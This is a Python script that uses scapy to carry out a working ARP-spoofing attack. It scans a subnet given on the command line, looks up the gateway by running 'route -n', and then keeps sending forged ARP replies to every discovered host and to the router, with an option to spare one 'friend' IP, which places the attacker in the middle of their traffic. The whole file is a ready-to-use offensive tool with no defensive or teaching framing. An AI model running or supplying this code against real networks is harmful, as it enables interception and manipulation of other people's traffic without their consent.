#!/usr/bin/env python3
import time
import sys
import subprocess
import re

import scapy.all as scapy
from optparse import OptionParser


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    return arp_request_broadcast


def get_info_devices(arp_request_broadcast, exception_ip):
    anwsered, unanwsered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    target_list = []
    for element in anwsered:
        target_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        if exception_ip is str(target_dict["ip"]):
            continue
        else:
            target_list.append(target_dict)
    return target_list


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    anwsered, unanwsered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return anwsered[0][1].hwsrc


def spoof(target, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target["ip"], hwdst=target["mac"], psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def attack(targets, router_ip):
    router_mac = get_mac_address(router_ip)
    router = {"ip": router_ip, "mac": router_mac}

    number_packet = 0
    try:
        while True:
            number_packet = number_packet + 2
            for target in targets:
                spoof(target, router_ip) # spoof victim
                spoof(router, target["ip"]) # spoof router
                print(f"\r[+] Sent {number_packet} packets to {target['ip']}", end=" ")
    except KeyboardInterrupt:
        for target in targets:
            restore(target, router)
            restore(router, target)
        print("\n[-] Detected Ctrl + C ... quitting")
    time.sleep(2)


def restore(destination, source):
    packet = scapy.ARP(op=2, pdst=destination["ip"], hwdst=destination["mac"], psrc=source["ip"], hwsrc=source["mac"])
    scapy.send(packet, count=4, verbose=False)


def process_router_ip(command):
    return subprocess.check_output(command, shell=True)


def get_router_ip():
    result_command = process_router_ip("route -n")
    router_ip = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', str(result_command))
    return str(router_ip[1])


def return_error(parser, options):
    if not options.target_ip:
        parser.error("[-] Target ip not found")


def return_arguments():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="range of ip addresses")
    parser.add_option("-f", "--friend", dest="exception_ip", help="Not attack this ip")
    options, arguments = parser.parse_args()
    return_error(parser, options)
    return options


def main():
    options = return_arguments()
    get_arp_request_broadcast = scan(options.target_ip)
    list_targets = get_info_devices(get_arp_request_broadcast, options.exception_ip)
    router_ip = get_router_ip()
    attack(list_targets, router_ip)


if __name__ == "__main__":
    main()
